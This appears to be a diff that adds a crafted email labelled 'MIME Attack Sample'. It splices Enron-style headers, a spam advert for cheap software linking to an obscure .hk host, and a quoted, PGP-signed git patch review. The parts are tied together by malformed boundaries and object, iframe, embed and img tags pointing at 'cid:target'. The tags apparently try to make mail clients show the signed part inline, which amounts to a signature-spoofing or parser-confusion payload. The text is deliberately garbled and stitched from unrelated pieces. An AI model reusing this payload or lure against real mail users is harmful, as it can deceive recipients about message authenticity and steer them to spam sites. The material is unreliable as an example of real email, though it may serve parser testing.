@@ -1,0 +1,126 @@
+From: John Watson [mailto:john.watson@pdq.net]
+To: paul.devries@enron.com, garrett.tripp@enron.com, paul.goddard@enron.com, 
+Subject: MIME Attack Sample
+Content-Type: multipart/related; boundary="DELIMITER"
+--DELIMITER
+Content-Type: text/html
+Content-Type: text/plain;
+	charset="windows-1250"
+Content-Transfer-Encoding: 7bit
+
+
+NEVER PAY MORE FOR THE SOFTWARES YOU WANT TO HAVE FROM LONG.
+
+Now you can have them at below $100.
+Quite Unbelievable....but its true.
+Now you can have cheap software.  
+
+Go get it now.
+Here at homeSpending his manly.
+
+
+------=_NextPart_000_0006_01C7B684.87763DC0
+Content-Type: text/html;
+	charset="windows-1250"
+Content-Transfer-Encoding: quoted-printable
+
+<html xmlns:o=3D"urn:schemas-microsoft-com:office:office" xmlns:w=3D"urn:sc=
+hemas-microsoft-com:office:word" xmlns=3D"http://www.w3.org/TR/REC-html40">
+
+<head>
+<META HTTP-EQUIV=3D"Content-Type" CONTENT=3D"text/html; charset=3Dwindows-1250">
+<meta name=3DGenerator content=3D"Microsoft Word 11 (filtered medium)">
+</head>
+<body>
+<html>
+<body bgcolor=3D"#ffffff">
+<div style=3D"border-color: #FFFFFF; border-right-width: 0px; border-bottom=
+-width: 0px; margin-bottom: 0px;" align=3D"center">
+<table style=3D"border: 1px; border-style: solid; border-color:#000000; fon=
+t-family: Tahoma; font-weight: bold;" bgcolor=3D"#00FFCC" cellpadding=3D"5"=
+ cellspacing=3D"1">
+<tr><td style=3D"border: 1px; border-style: solid; border-color:#000000; co=
+lor:#FFFFFF" bgcolor=3D"#0000FF" align=3Dcenter>
+NEVER PAY MORE FOR THE SOFTWARES YOU WANT TO HAVE FROM LONG.
+</td></tr>
+<tr><td align=3Dcenter>
+Now you can have them at below $100.<br>
+Quite Unbelievable....but its true.<br>
+Now you can have cheap software. <br> 
+
+<a href=3D'http://8recwfece1w9e98ld8q3d8q8.sdsxc.hk/ '>Go get it now.</a></=
+td>
+</tr>
+</table>
+</div></body></html>
+Here at homeSpending his manly.
+</body>
+</html>
+
+------=_NextPart_000_0006_01C7B684.87763DC0--
+
+<object width="100%" height="25" data="cid:target"></object>
+<iframe width="100%" height="25"  src="cid:target"></iframe>
+<embed  width="100%" height="25" src="cid:target"/></embed><img    width="100"  height="25"  src="cid:target">
+--DELIMITER
+Content-ID: <target>Content-Type: multipart/signed; boundary="BOUNDARY";  protocol="application/pgp-signature"
+--BOUNDARY
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+h: SHA1
+> 
+> - ---
+>  services/presence/server_plugin.py |   15 +++++++--------
+>  1 files changed, 7 insertions(+), 8 deletions(-)
+
+Looks good
+
+> diff --git a/services/presence/server_plugin.py b/services/presence/server_plugin.py
+> index 8556792..486bec4 100644
+> - --- a/services/presence/server_plugin.py
+> +++ b/services/presence/server_plugin.py
+> @@ -24,6 +24,12 @@ from buddyiconcache import BuddyIconCache
+>  import logging
+>  import os
+>  
+> +try:
+> +    # Python >= 2.5
+> +    from hashlib import md5
+> +except ImportError:
+> +    from md5 import new as md5
+> +
+>  import sys
+>  import psutils
+>  
+> @@ -397,14 +403,7 @@ class ServerPlugin(gobject.GObject):
+>          if not icon_data:
+>              icon_data = self._owner.props.icon
+>  
+> - -        m = None
+> - -        if sys.version_info[:3] >= (2, 5, 0):
+> - -            import hashlib
+> - -            m = hashlib.md5()
+> - -        else:
+> - -            import md5
+> - -            m = md5.new()
+> - -
+> +        m = md5()
+>          m.update(icon_data)
+>          hash = m.hexdigest()
+>  
+> - -- 
+> 1.5.2-rc3.GIT
+> 
+> -BOUNDARY--
+Content-Type: application/pgp-signature; name="signature.asc"
+BEGIN PGP SIGNATURE-----
+> Version: GnuPG v1.4.6 (GNU/Linux)
+> Comment: OpenPGP key: http://www.pseudorandom.co.uk/2003/contact/ or pgp.net
+> 
+> iD8DBQFGVXs+WSc8zVUw7HYRAoKkAKC8KYV2LnUnW4pLKT8pDwrUW0351QCdG3Xo
+> EpqPrqBFkbS2J6BkyCTQVZA=
+> =YxOQ
+> -----END PGP SIGNATURE-----
+> ___
+--BOUNDARY--
+--DELIMITER--
